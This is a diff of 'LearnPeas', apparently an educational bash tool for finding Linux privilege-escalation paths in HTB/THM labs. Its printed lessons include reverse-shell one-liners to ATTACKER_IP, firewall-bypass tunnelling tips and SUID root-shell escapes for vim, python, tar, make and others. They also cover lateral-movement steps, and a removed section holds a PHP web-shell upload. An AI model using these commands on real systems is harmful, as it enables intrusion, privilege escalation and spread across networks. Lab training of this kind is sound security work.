@@ -1,5 +1,5 @@
 #!/bin/bash
-# LearnPEAS: Privilege Escalation In-Field Educational Tool
+# LearnPeas -  Privilege Escalation In-Field Educational Tool
 # Comprehensive enumeration + education for HTB/THM environments
 
 set -o pipefail
@@ -72,16 +72,14 @@ enum_system() {
     teach "  • User groups → Special privileges (docker, lxd, disk, etc.)"
 }
 
-# === NETWORK INFORMATION ===
-# === ENHANCED NETWORK ENUMERATION ===
 # === ENHANCED NETWORK ENUMERATION ===
 enum_network() {
     section "NETWORK CONFIGURATION"
     
-    explain_concept "Network Enumeration" \
-        "Understanding network configuration reveals internal services, pivot opportunities, and firewall restrictions." \
-        "Services on localhost (127.0.0.1) aren't exposed externally but accessible after shell access - often have no authentication. Internal networks allow pivoting to other hosts. Firewall rules show what's blocked and what attack vectors work." \
-        "Key checks:\n  • Localhost-only services (databases, Redis, Elasticsearch)\n  • Internal network routes (pivot targets)\n  • Firewall rules (what's blocked/allowed)\n  • Port forwarding opportunities"
+    local found_localhost_services=0
+    local found_internal_networks=0
+    local found_firewall_restrictions=0
+    local found_arp_hosts=0
     
     # === CHECK 1: Network Interfaces ===
     info "Network interfaces:"
@@ -132,6 +130,7 @@ enum_network() {
                     if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                         risk_level="warn"
                         exploitation="Likely no auth required - access after gaining shell"
+                        found_localhost_services=1
                     else
                         risk_level="info"
                         exploitation="Try default credentials: root:root, root:password"
@@ -142,6 +141,7 @@ enum_network() {
                     if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                         risk_level="warn"
                         exploitation="Localhost only - likely passwordless trust authentication"
+                        found_localhost_services=1
                     fi
                     ;;
                 6379)
@@ -149,6 +149,7 @@ enum_network() {
                     if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                         risk_level="critical"
                         exploitation="Redis on localhost - usually NO AUTH! Write cron jobs or SSH keys"
+                        found_localhost_services=1
                     else
                         risk_level="warn"
                         exploitation="Try: redis-cli -h $ip ping"
@@ -159,6 +160,7 @@ enum_network() {
                     if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                         risk_level="warn"
                         exploitation="Elasticsearch on localhost - no auth by default"
+                        found_localhost_services=1
                     else
                         risk_level="warn"
                         exploitation="Check: curl http://$ip:9200/_cat/indices"
@@ -168,18 +170,23 @@ enum_network() {
                     service_name="Memcached"
                     risk_level="warn"
                     exploitation="No authentication - read cached session data"
+                    found_localhost_services=1
                     ;;
                 27017)
                     service_name="MongoDB"
                     if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                         risk_level="warn"
                         exploitation="MongoDB on localhost - often no auth"
+                        found_localhost_services=1
                     fi
                     ;;
                 5672|15672)
                     service_name="RabbitMQ"
                     risk_level="info"
                     exploitation="Default creds: guest:guest (only works from localhost)"
+                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
+                        found_localhost_services=1
+                    fi
                     ;;
                 8009)
                     service_name="Apache Tomcat AJP"
@@ -210,11 +217,6 @@ enum_network() {
                         ;;
                 esac
                 
-                teach "  After getting a shell, you can access this service directly"
-                teach "  Option 1 - Direct access: curl http://localhost:$port"
-                teach "  Option 2 - Forward to your machine: ssh -L $port:localhost:$port user@target"
-                teach "  Then access from your browser at http://localhost:$port"
-                
             elif echo "$ip" | grep -qE "0\.0\.0\.0|::|\*"; then
                 # Externally accessible
                 if [ "$risk_level" = "critical" ] || [ "$risk_level" = "warn" ]; then
@@ -235,15 +237,62 @@ enum_network() {
             
             if echo "$local_addr" | grep -qE "127\.0\.0\.1|::1"; then
                 warn "LOCALHOST-ONLY service: $local_addr (Process: $process)"
+                found_localhost_services=1
             else
                 info "Listening: $local_addr (Process: $process)"
             fi
         done
     fi
     
+    # === CONDITIONAL EDUCATION: Localhost Services ===
+    if [ $found_localhost_services -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  LOCALHOST SERVICES - Why They Matter"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "WHAT ARE LOCALHOST SERVICES:"
+        teach "  Services bound to 127.0.0.1 (localhost) are only accessible"
+        teach "  from the machine itself, not from the network."
+        teach ""
+        teach "WHY THEY'RE VULNERABLE:"
+        teach "  Admins assume 'if it's localhost-only, it's safe' so they:"
+        teach "  • Disable authentication (no password needed)"
+        teach "  • Use weak/default credentials"
+        teach "  • Don't apply security patches"
+        teach "  • Enable dangerous features"
+        teach ""
+        teach "  The thinking: 'Only I can access it, so why secure it?'"
+        teach "  The reality: After YOU get a shell, YOU can access it too."
+        teach ""
+        teach "HOW TO EXPLOIT:"
+        teach "  1. Get initial shell access (any user, any method)"
+        teach "  2. From that shell: curl http://localhost:PORT"
+        teach "  3. Service often has no auth or weak auth"
+        teach "  4. Exploit service for privilege escalation"
+        teach ""
+        teach "COMMON LOCALHOST SERVICES:"
+        teach "  • MySQL on 127.0.0.1:3306"
+        teach "    - Often trusts local connections without password"
+        teach "    - Can read/write files if running as root"
+        teach ""
+        teach "  • Redis on 127.0.0.1:6379"
+        teach "    - Usually NO authentication at all"
+        teach "    - Can write to filesystem (cron jobs, SSH keys)"
+        teach ""
+        teach "  • Elasticsearch on 127.0.0.1:9200"
+        teach "    - No auth by default"
+        teach "    - Can extract sensitive data"
+        teach ""
+        teach "PORT FORWARDING (Access from Your Machine):"
+        teach "  If you want to access localhost service from your computer:"
+        teach "  SSH tunnel: ssh -L 8080:localhost:3306 user@target"
+        teach "  Then on your machine: mysql -h 127.0.0.1 -P 8080"
+        log ""
+    fi
+    
     # === CHECK 3: Routing Table Analysis ===
     info "Routing table (potential pivot targets):"
-    local found_internal=0
     
     if command -v ip >/dev/null 2>&1; then
         ip route 2>/dev/null | while read line; do
@@ -256,21 +305,77 @@ enum_network() {
             
             # Identify internal network routes (but only first occurrence)
             if echo "$line" | grep -qE "^10\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^192\.168\."; then
-                if [ $found_internal -eq 0 ]; then
+                if [ $found_internal_networks -eq 0 ]; then
                     local network=$(echo "$line" | awk '{print $1}')
                     warn "Internal network detected: $network"
-                    teach "  This is a private network - other machines might be reachable"
-                    teach "  After compromising this host, scan the network to find other targets"
-                    teach "  Discovery: for i in {1..254}; do ping -c1 -W1 ${network%.*}.\$i 2>/dev/null && echo ${network%.*}.\$i is up; done"
-                    teach "  Or use nmap: nmap -sn $network"
-                    found_internal=1
+                    found_internal_networks=1
                 fi
             fi
         done
     else
         route -n 2>/dev/null | tail -n +3 | while read line; do
             log "  $line"
+            if echo "$line" | grep -qE "^10\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^192\.168\."; then
+                found_internal_networks=1
+            fi
         done
+    fi
+    
+    # === CONDITIONAL EDUCATION: Internal Networks ===
+    if [ $found_internal_networks -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  INTERNAL NETWORKS - Lateral Movement Opportunities"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "WHAT ARE INTERNAL NETWORKS:"
+        teach "  Private IP ranges not routable on the internet:"
+        teach "  • 10.0.0.0/8        (10.x.x.x)"
+        teach "  • 172.16.0.0/12     (172.16-31.x.x)"
+        teach "  • 192.168.0.0/16    (192.168.x.x)"
+        teach ""
+        teach "WHY THEY MATTER:"
+        teach "  These networks contain other machines you can't reach from"
+        teach "  the internet. Once you compromise ONE machine in the network,"
+        teach "  you can pivot to attack the others."
+        teach ""
+        teach "  Think of it like breaking into a building:"
+        teach "  • External network = outside the building (public internet)"
+        teach "  • Internal network = inside the building (private network)"
+        teach "  • Once you're inside, you can access other rooms"
+        teach ""
+        teach "TYPICAL SCENARIO (HTB/Corporate):"
+        teach "  [Internet] → [DMZ Server] → [Internal Network]"
+        teach "               ↑ You are here"
+        teach ""
+        teach "  You compromise DMZ server (web server, VPN, etc.)"
+        teach "  From there, you can reach internal machines:"
+        teach "  • Database servers"
+        teach "  • File servers"
+        teach "  • Domain controllers"
+        teach "  • Employee workstations"
+        teach ""
+        teach "HOW TO DISCOVER OTHER MACHINES:"
+        teach "  1. Ping sweep (fast but noisy):"
+        teach "     for i in {1..254}; do"
+        teach "       ping -c1 -W1 192.168.1.\$i 2>/dev/null && echo 192.168.1.\$i is up"
+        teach "     done"
+        teach ""
+        teach "  2. Nmap scan (more thorough):"
+        teach "     nmap -sn 192.168.1.0/24  # Host discovery"
+        teach "     nmap -p- 192.168.1.50    # Port scan specific host"
+        teach ""
+        teach "  3. ARP scan (very quiet):"
+        teach "     arp-scan --local"
+        teach ""
+        teach "LATERAL MOVEMENT STRATEGY:"
+        teach "  1. Discover other hosts (as above)"
+        teach "  2. Scan for services"
+        teach "  3. Try credentials from current machine"
+        teach "  4. Look for SSH keys in /home/*/.ssh/"
+        teach "  5. Check for password reuse"
+        teach "  6. Pivot to next machine, repeat"
+        log ""
     fi
     
     # === CHECK 4: Firewall Rules ===
@@ -289,14 +394,12 @@ enum_network() {
                 # Check for common blocks
                 if iptables -L OUTPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
                     warn "Outbound traffic may be filtered - could block reverse shells"
-                    teach "  The firewall is blocking some outbound connections"
-                    teach "  This means reverse shells might not work on all ports"
-                    teach "  Solution: Try common allowed ports like 80 (HTTP), 443 (HTTPS), or 53 (DNS)"
-                    teach "  Example: nc -lvnp 443 (on your machine), then: bash -i >& /dev/tcp/YOUR_IP/443 0>&1 (on target)"
+                    found_firewall_restrictions=1
                 fi
                 
                 if iptables -L INPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
                     info "Inbound filtering detected - may limit bind shells"
+                    found_firewall_restrictions=1
                 fi
                 
                 # Check if rules are readable in detail
@@ -315,6 +418,7 @@ enum_network() {
             info "nftables is active"
             local table_count=$(nft list tables 2>/dev/null | wc -l)
             warn "Found $table_count nftables - may restrict connections"
+            found_firewall_restrictions=1
             teach "  View rules: nft list ruleset"
         fi
     fi
@@ -324,8 +428,8 @@ enum_network() {
         local ufw_status=$(ufw status 2>/dev/null | head -1)
         if echo "$ufw_status" | grep -qi "active"; then
             warn "UFW firewall is ACTIVE"
+            found_firewall_restrictions=1
             teach "  Check rules: ufw status verbose"
-            teach "  Reverse shells may be blocked - use allowed ports"
         elif echo "$ufw_status" | grep -qi "inactive"; then
             ok "UFW firewall is inactive"
         fi
@@ -335,9 +439,69 @@ enum_network() {
     if command -v firewall-cmd >/dev/null 2>&1; then
         if systemctl is-active --quiet firewalld 2>/dev/null; then
             warn "firewalld is ACTIVE"
+            found_firewall_restrictions=1
             teach "  Check zones: firewall-cmd --get-active-zones"
             teach "  List rules: firewall-cmd --list-all"
         fi
+    fi
+    
+    # === CONDITIONAL EDUCATION: Firewall Restrictions ===
+    if [ $found_firewall_restrictions -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  FIREWALLS - Why Your Reverse Shell Won't Connect"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "WHAT FIREWALLS DO:"
+        teach "  Block/allow network connections based on rules:"
+        teach "  • Source/destination IP addresses"
+        teach "  • Port numbers"
+        teach "  • Direction (inbound/outbound)"
+        teach "  • Protocol (TCP/UDP)"
+        teach ""
+        teach "WHY THIS AFFECTS YOU:"
+        teach "  Your typical reverse shell:"
+        teach "  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
+        teach "         ↑"
+        teach "  This creates OUTBOUND connection to port 4444"
+        teach "  If firewall blocks outbound to port 4444 = shell fails"
+        teach ""
+        teach "FIREWALL TYPES:"
+        teach "  1. iptables (traditional)"
+        teach "  2. nftables (modern replacement)"
+        teach "  3. ufw (user-friendly wrapper for iptables)"
+        teach "  4. firewalld (Red Hat/CentOS)"
+        teach ""
+        teach "COMMON CONFIGURATIONS:"
+        teach "  • Allow outbound 80 (HTTP)"
+        teach "  • Allow outbound 443 (HTTPS)"
+        teach "  • Allow outbound 53 (DNS)"
+        teach "  • Block everything else"
+        teach ""
+        teach "BYPASS TECHNIQUES:"
+        teach ""
+        teach "  1. Use allowed ports:"
+        teach "     On attacker: nc -lvnp 443"
+        teach "     On target: bash -i >& /dev/tcp/ATTACKER/443 0>&1"
+        teach ""
+        teach "  2. Use DNS tunneling (if DNS allowed):"
+        teach "     Tools: iodine, dnscat2"
+        teach ""
+        teach "  3. Use ICMP (ping) tunneling:"
+        teach "     Tools: icmpsh, ptunnel"
+        teach ""
+        teach "  4. HTTP/HTTPS reverse shells:"
+        teach "     Harder to detect/block"
+        teach "     Tools: Metasploit http(s) payloads"
+        teach ""
+        teach "HOW TO TEST:"
+        teach "  From compromised machine:"
+        teach "  nc -zv ATTACKER_IP 4444    # Test port 4444"
+        teach "  nc -zv ATTACKER_IP 443     # Test port 443"
+        teach "  nc -zv ATTACKER_IP 80      # Test port 80"
+        teach ""
+        teach "  Whichever succeeds, use that port for reverse shell"
+        log ""
     fi
     
     # === CHECK 5: ARP Cache (Nearby Hosts) ===
@@ -350,11 +514,46 @@ enum_network() {
             echo "$arp_entries" | head -10 | while read host; do
                 log "  $host"
             done
-            teach "These hosts are on the same local network as this machine"
-            teach "  After compromising this host, you can try to access those other machines"
-            teach "  This is called 'lateral movement' - moving from one compromised host to another"
-            teach "  Discovery command: nmap -sn <network_range> (example: nmap -sn 192.168.1.0/24)"
+            found_arp_hosts=1
         fi
+    fi
+    
+    # === CONDITIONAL EDUCATION: ARP Cache ===
+    if [ $found_arp_hosts -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  ARP CACHE - Finding Nearby Machines"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "WHAT IS ARP:"
+        teach "  Address Resolution Protocol maps IP addresses to MAC addresses"
+        teach "  on the local network. When machine A talks to machine B:"
+        teach "  1. A asks: 'Who has IP 192.168.1.50?' (ARP request)"
+        teach "  2. B responds: 'I do, my MAC is aa:bb:cc:dd:ee:ff'"
+        teach "  3. A caches this: 192.168.1.50 = aa:bb:cc:dd:ee:ff"
+        teach ""
+        teach "WHY THE CACHE MATTERS:"
+        teach "  The ARP cache shows which machines this host has RECENTLY"
+        teach "  communicated with. These are your lateral movement targets."
+        teach ""
+        teach "WHAT IT TELLS YOU:"
+        teach "  • Other machines on same network segment"
+        teach "  • Recently active hosts (not old DNS records)"
+        teach "  • Machines this host regularly talks to"
+        teach ""
+        teach "EXPLOITATION:"
+        teach "  These hosts are on the same local network, meaning:"
+        teach "  • No firewall between you and them (usually)"
+        teach "  • Fast network connection"
+        teach "  • May trust this machine"
+        teach "  • May have shared credentials"
+        teach ""
+        teach "NEXT STEPS:"
+        teach "  1. Port scan these hosts: nmap -sn <IP>"
+        teach "  2. Try credentials from current machine"
+        teach "  3. Check /home/*/.ssh/ for SSH keys to these hosts"
+        teach "  4. Look for config files mentioning these IPs"
+        log ""
     fi
     
     # === CHECK 6: Network Namespaces ===
@@ -368,23 +567,11 @@ enum_network() {
     
     # === Summary ===
     log ""
-    info "Network enumeration complete"
-    teach "\nKey network attack vectors explained:"
-    teach "  1. Localhost services = Services only accessible from inside the machine"
-    teach "     → After you get a shell, you can access them (usually no password)"
-    teach "     → Example: MySQL on localhost often trusts local connections"
-    teach ""
-    teach "  2. Internal networks = Private networks with other machines"
-    teach "     → These aren't accessible from the internet"
-    teach "     → After compromising one machine, scan for others and move sideways"
-    teach ""
-    teach "  3. Firewall rules = What connections are allowed/blocked"
-    teach "     → Affects which ports work for reverse shells"
-    teach "     → If port 4444 is blocked, try port 443 (HTTPS) instead"
-    teach ""
-    teach "  4. Port forwarding = Tunneling internal services to your machine"
-    teach "     → Makes localhost services accessible from your computer"
-    teach "     → Command: ssh -L local_port:localhost:remote_port user@target"
+    if [ $found_localhost_services -eq 1 ] || [ $found_internal_networks -eq 1 ] || [ $found_firewall_restrictions -eq 1 ] || [ $found_arp_hosts -eq 1 ]; then
+        info "Network enumeration complete - review findings above"
+    else
+        ok "Network enumeration complete - no significant attack vectors found"
+    fi
 }
 # === USER ENUMERATION ===
 enum_users() {
@@ -947,158 +1134,159 @@ enum_suid() {
     section "SUID BINARY ANALYSIS"
     
     explain_concept "SUID Bit" \
-        "SUID (Set User ID) allows a program to run with the file owner's privileges. If owner is root, program runs as root regardless of who executes it." \
+        "SUID allows a program to run with the file owner's privileges. If owner is root, program runs as root regardless of who executes it." \
         "Legitimate use: /usr/bin/passwd needs root to modify /etc/shadow. Dangerous: Custom SUID binaries may have vulnerabilities, call other programs unsafely, or have shell escape features." \
         "Attack vectors:\n  1. Binary spawns a shell directly\n  2. Binary calls other programs without absolute paths (PATH hijacking)\n  3. Binary has buffer overflow or other memory corruption\n  4. Binary has command injection vulnerability"
     
-    # Known legitimate SUID binaries (expanded for modern systems)
+    # Comprehensive whitelist of legitimate SUID binaries
     local legit_suid=(
-        "/usr/bin/passwd" "/usr/bin/sudo" "/usr/bin/su"
-        "/usr/bin/mount" "/usr/bin/umount" "/usr/bin/chsh"
-        "/usr/bin/chfn" "/usr/bin/gpasswd" "/usr/bin/newgrp"
-        "/bin/ping" "/bin/ping6" "/usr/bin/pkexec"
-        "/usr/bin/fusermount" "/usr/lib/openssh/ssh-keysign"
-        "/bin/su" "/bin/mount" "/bin/umount" "/bin/fusermount"
-        "/bin/ntfs-3g" "/usr/bin/newuidmap" "/usr/bin/newgidmap"
-        "/usr/bin/at" "/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic"
-        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
+        "/usr/bin/passwd" "/usr/bin/sudo" "/usr/bin/su" "/bin/su"
+        "/usr/bin/chsh" "/usr/bin/chfn" "/usr/bin/gpasswd" "/usr/bin/newgrp"
+        "/usr/bin/mount" "/usr/bin/umount" "/bin/mount" "/bin/umount"
+        "/usr/bin/fusermount" "/usr/bin/fusermount3" "/bin/fusermount"
+        "/usr/bin/ntfs-3g" "/bin/ntfs-3g"
+        "/bin/ping" "/bin/ping6" "/usr/bin/ping" "/usr/bin/ping6"
+        "/usr/bin/newuidmap" "/usr/bin/newgidmap"
+        "/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic"
         "/usr/lib/snapd/snap-confine"
+        "/usr/bin/pkexec"
         "/usr/lib/policykit-1/polkit-agent-helper-1"
-        "/usr/lib/eject/dmcrypt-get-device"
-        "/usr/bin/fusermount3" "/usr/bin/ntfs-3g"
-        "/usr/lib/chromium/chrome-sandbox" "/usr/share/codium/chrome-sandbox"
-        "/usr/lib/xorg/Xorg.wrap" "/usr/sbin/pppd" "/usr/sbin/exim4"
-        "/usr/libexec/xscreensaver/xscreensaver-auth"
+        "/usr/lib/polkit-1/polkit-agent-helper-1"
+        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
+        "/usr/lib/xorg/Xorg.wrap"
+        "/usr/lib/openssh/ssh-keysign"
+        "/usr/bin/at"
+        "/usr/sbin/pppd"
     )
     
-    local found_interesting=0
-    
     find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -4000 -type f -print 2>/dev/null | while read suid_bin; do
-
         local is_legit=0
         
         for legit in "${legit_suid[@]}"; do
-            [ "$suid_bin" = "$legit" ] && is_legit=1 && break
+            if [ "$suid_bin" = "$legit" ]; then
+                is_legit=1
+                break
+            fi
         done
         
         if [ $is_legit -eq 0 ]; then
             vuln "Non-standard SUID binary: $suid_bin"
-            found_interesting=1
             
             local owner=$(stat -c %U "$suid_bin" 2>/dev/null)
             local perms=$(stat -c %a "$suid_bin" 2>/dev/null)
+            log "  Owner: $owner | Permissions: $perms"
             
-            log "    Owner: $owner | Permissions: $perms"
-            
-            # Analyze what it does
             local file_type=$(file "$suid_bin" 2>/dev/null)
             if echo "$file_type" | grep -q "script"; then
-                warn "    This is a script with SUID - scripts ignore SUID on most systems"
-                teach "    However, check if it calls other binaries you can manipulate"
+                warn "  Script with SUID bit - kernel ignores this"
+                log ""
+                continue
             fi
             
-            # Check if it's a known exploitable binary
+            log ""
             local basename=$(basename "$suid_bin")
+            
             case $basename in
-                nmap)
-                    critical "SUID nmap - Instant root: nmap --interactive then !sh"
-                    teach "  → nmap --interactive → !sh (older versions)"
+                vim|vi)
+                    critical "SUID vim/vi - Shell escape available"
+                    teach "  $suid_bin -c ':!/bin/bash -p'"
+                    teach "  Or: $suid_bin then :set shell=/bin/bash then :shell"
                     ;;
-                vim)
-                    critical "SUID vim - Instant root: vim -c ':!/bin/sh -p'"
-                    teach "  → vim -c ':!/bin/sh -p'"
-                    ;;
-                vi)
-                    critical "SUID vi - Instant root: vi -c ':!/bin/sh -p'"
-                    teach "  → vi -c ':!/bin/sh -p'"
-                    ;;
+                    
                 nano)
-                    teach "  → nano, then ^R^X reset; sh -p"
+                    critical "SUID nano - Command execution via Control-R Control-X"
+                    teach "  $suid_bin then Ctrl+R Ctrl+X then type: reset; bash -p"
                     ;;
+                    
                 find)
-                    critical "SUID find - Instant root: find . -exec /bin/sh -p \\; -quit"
-                    teach "  → find . -exec /bin/sh -p \\; -quit"
+                    critical "SUID find - Execute commands via -exec"
+                    teach "  $suid_bin . -exec /bin/bash -p \\; -quit"
                     ;;
+                    
                 python*|python)
-                    critical "SUID python - Instant root: python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
-                    teach "  → python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+                    critical "SUID python - Direct shell spawn"
+                    teach "  $suid_bin -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
                     ;;
+                    
                 perl)
-                    critical "SUID perl - Instant root: perl -e 'exec \"/bin/sh\", \"-p\";'"
-                    teach "  → perl -e 'exec \"/bin/sh\", \"-p\";'"
+                    critical "SUID perl - Execute shell"
+                    teach "  $suid_bin -e 'exec \"/bin/bash\", \"-p\";'"
                     ;;
+                    
                 ruby)
-                    critical "SUID ruby - Instant root: ruby -e 'exec \"/bin/sh\", \"-p\"'"
-                    teach "  → ruby -e 'exec \"/bin/sh\", \"-p\"'"
+                    critical "SUID ruby - Spawn privileged shell"
+                    teach "  $suid_bin -e 'exec \"/bin/bash\", \"-p\"'"
                     ;;
-                node)
-                    critical "SUID node - Instant root: node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'"
-                    teach "  → node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'"
+                    
+                node|nodejs)
+                    critical "SUID node - Child process spawn"
+                    teach "  $suid_bin -e 'require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
                     ;;
-                bash)
-                    critical "SUID bash - Instant root: bash -p"
-                    teach "  → bash -p"
+                    
+                bash|sh|zsh|dash)
+                    critical "SUID shell - Direct root access"
+                    teach "  $suid_bin -p"
                     ;;
-                sh)
-                    critical "SUID sh - Instant root: sh -p"
-                    teach "  → sh -p"
+                    
+                awk|gawk|nawk)
+                    critical "SUID awk - System call execution"
+                    teach "  $suid_bin 'BEGIN {system(\"/bin/bash -p\")}'"
                     ;;
-                zsh)
-                    critical "SUID zsh - Instant root: zsh"
-                    teach "  → zsh"
+                    
+                less|more)
+                    critical "SUID less/more - Shell escape via bang"
+                    teach "  $suid_bin /etc/profile then type: !/bin/bash -p"
                     ;;
-                awk)
-                    critical "SUID awk - Instant root: awk 'BEGIN {system(\"/bin/sh -p\")}'"
-                    teach "  → awk 'BEGIN {system(\"/bin/sh -p\")}'"
-                    ;;
-                less)
-                    critical "SUID less - Instant root: less /etc/profile then !sh"
-                    teach "  → less /etc/profile, then !sh"
-                    ;;
-                more)
-                    critical "SUID more - Instant root: more /etc/profile then !sh"
-                    teach "  → more /etc/profile, then !sh"
-                    ;;
-                systemctl)
-                    critical "SUID systemctl - Create malicious service"
-                    teach "  → echo '[Service]' > /tmp/root.service"
-                    teach "  → echo 'ExecStart=/bin/sh -c \"chmod +s /bin/bash\"' >> /tmp/root.service"
-                    teach "  → systemctl link /tmp/root.service"
-                    teach "  → systemctl start root"
-                    ;;
-                tail)
-                    teach "  → tail -c1G /etc/shadow (reads file)"
-                    ;;
-                strace)
-                    teach "  → strace -o /dev/null /bin/sh -p"
-                    ;;
+                    
                 env)
-                    critical "SUID env - Execute shell: env /bin/sh -p"
-                    teach "  → env /bin/sh -p"
+                    critical "SUID env - Execute arbitrary binary"
+                    teach "  $suid_bin /bin/bash -p"
                     ;;
-                cut)
-                    teach "  → cut -d: -f1 /etc/shadow (reads file)"
+                    
+                systemctl)
+                    critical "SUID systemctl - Shell escape via pager"
+                    teach "  $suid_bin status trail.service"
+                    teach "  Wait for pager then type: !bash -p"
                     ;;
-                diff)
-                    teach "  → diff --line-format=%L /dev/null /etc/shadow"
+                    
+                yum)
+                    critical "SUID yum - Plugin exploitation for root shell"
+                    teach "  TF=\$(mktemp -d)"
+                    teach "  echo 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' > \$TF/x.py"
+                    teach "  $suid_bin -c \"exec=python \$TF/x.py\" --plugins=\$TF"
                     ;;
-                php)
-                    critical "SUID php - Execute commands: php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"
-                    teach "  → php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"
+                    
+                apt|apt-get)
+                    critical "SUID apt - Execute commands via APT Pre-Invoke"
+                    teach "  $suid_bin update -o APT::Update::Pre-Invoke::=/bin/sh"
                     ;;
+                    
+                git)
+                    teach "  $suid_bin help status then in pager: !sh"
+                    ;;
+                    
+                tar)
+                    critical "SUID tar - Checkpoint action execution"
+                    teach "  $suid_bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+                    ;;
+                    
+                make)
+                    critical "SUID make - Execute Makefile commands"
+                    teach "  $suid_bin -s --eval=\$'x:\\n\\t-/bin/bash -p'"
+                    ;;
+                    
                 *)
-                    teach "  → Analysis steps:"
-                    teach "      strings $suid_bin | grep -E 'system|exec|popen'"
-                    teach "      ltrace $suid_bin 2>&1 | grep -E 'system|exec'"
-                    teach "      Check GTFOBins for: $basename"
+                    teach "  Analysis steps:"
+                    teach "    1. Check GTFOBins: https://gtfobins.github.io/"
+                    teach "    2. strings $suid_bin | grep -E 'system|exec|popen'"
+                    teach "    3. ltrace $suid_bin 2>&1 | grep -E 'system|exec'"
+                    teach "    4. Check for PATH hijacking if it calls commands without full paths"
                     ;;
             esac
+            log ""
         fi
     done
-    
-    [ $found_interesting -eq 0 ] && ok "Only standard SUID binaries found"
 }
-
 # === SGID BINARIES ===
 enum_sgid() {
     section "SGID BINARY ANALYSIS"
@@ -1207,21 +1395,40 @@ enum_databases() {
     fi
 }
 
-# === WEB APPLICATION ENUMERATION ===
-# === ENHANCED WEB APPLICATION ENUMERATION ===
+#!/bin/bash
+
 # === ENHANCED WEB APPLICATION ENUMERATION ===
 enum_web() {
     [ $EXTENDED -eq 0 ] && return
     
     section "WEB APPLICATION ENUMERATION"
     
-    explain_concept "Web Application Attacks" \
-        "Web applications often store credentials, have writable directories, or run with elevated privileges." \
-        "Common issues: hardcoded credentials in config files, writable web roots allowing shell upload, database credentials, API tokens, LFI/RFI vulnerabilities, existing backdoors from previous compromises." \
-        "Where to look:\n  • /var/www/html - Default web root\n  • /var/www - Alternative location\n  • /opt/* - Custom applications\n  • Look for: config.php, .env, wp-config.php, database.yml\n  • Upload directories\n  • Existing web shells"
+    # === PHASE 1: SILENT SCAN - Collect findings ===
+    local found_writable_webroot=0
+    local found_writable_uploads=0
+    local found_credentials=0
+    local found_web_shells=0
+    local found_wordpress=0
+    local found_frameworks=0
+    local found_logs_with_creds=0
+    
+    local temp_writable_roots="/tmp/.learnpeas_web_roots_$$"
+    local temp_writable_uploads="/tmp/.learnpeas_web_uploads_$$"
+    local temp_configs="/tmp/.learnpeas_web_configs_$$"
+    local temp_shells="/tmp/.learnpeas_web_shells_$$"
+    local temp_wordpress="/tmp/.learnpeas_wordpress_$$"
+    local temp_frameworks="/tmp/.learnpeas_frameworks_$$"
+    local temp_log_creds="/tmp/.learnpeas_log_creds_$$"
+    
+    # Cleanup function
+    cleanup_web_temps() {
+        rm -f "$temp_writable_roots" "$temp_writable_uploads" "$temp_configs" \
+              "$temp_shells" "$temp_wordpress" "$temp_frameworks" "$temp_log_creds" 2>/dev/null
+    }
+    trap cleanup_web_temps RETURN
     
     # Check common web roots
-    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt" "/srv/www")
+    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
     local checked_dirs=()
     
     for webroot in "${web_roots[@]}"; do
@@ -1236,266 +1443,414 @@ enum_web() {
         [ $skip -eq 1 ] && continue
         
         if [ -d "$webroot" ]; then
-            info "Found web directory: $webroot"
             checked_dirs+=("$webroot")
             
             # === CHECK 1: Writable Web Root ===
             if [ -w "$webroot" ]; then
-                critical "Web root WRITABLE - Upload shell for remote code execution"
-                vuln "Web root is WRITABLE: $webroot"
-                explain_concept "Writable Web Root Exploitation" \
-                    "If you can write to the web server's document root, you can upload a web shell and execute commands through the web browser." \
-                    "Web servers execute scripts in their document root. If writable, upload PHP/JSP/ASPX shell. Web server process (www-data, apache, nginx) becomes your execution context." \
-                    "Exploitation:\n  1. Create shell: echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php\n  2. Make it hidden: echo '<?php system(\$_GET[\"c\"]); ?>' > $webroot/.shell.php\n  3. Access: curl http://localhost/shell.php?cmd=id\n  4. Upgrade to reverse shell from there"
-                
-                teach "PHP shell upload:"
-                teach "  echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
